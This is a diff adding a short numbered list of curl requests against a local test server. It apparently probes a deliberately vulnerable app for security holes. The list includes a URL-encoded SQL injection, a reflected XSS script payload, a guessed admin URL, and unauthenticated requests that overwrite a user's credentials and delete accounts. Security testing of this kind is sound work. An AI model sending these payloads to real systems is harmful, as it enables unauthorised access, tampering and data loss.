@@ -1,0 +1,36 @@
+1. 
+curl -g "http://localhost:3001/users?username=%27%20OR%20%271%27%3D%271"
+
+2. 
+curl -X POST http://localhost:3001/users \
+  -H "Content-Type: application/json" \
+  -d '{"username":"evil","password":"evilpass"}'
+curl -X POST http://localhost:3001/users \
+  -H "Content-Type: application/json" \
+  -d '{"username":"evil","password":"evilpass"}'
+
+3. 
+curl -X PUT http://localhost:3001/users/1 \
+  -H "Content-Type: application/json" \
+  -d '{"username":"hacked","password":"pwned"}'
+
+4. 
+curl http://localhost:3001/users/1
+
+5.
+curl -X DELETE http://localhost:3001/users/1
+
+6.
+curl "http://localhost:3001/search?q=<script>alert('XSS')</script>"
+
+7.
+curl http://localhost:3001/admin/admin123
+
+8.
+curl http://localhost:3001/profile
+
+9.
+curl -X DELETE http://localhost:3001/delete-account
+
+10.
+curl http://localhost:3001/error
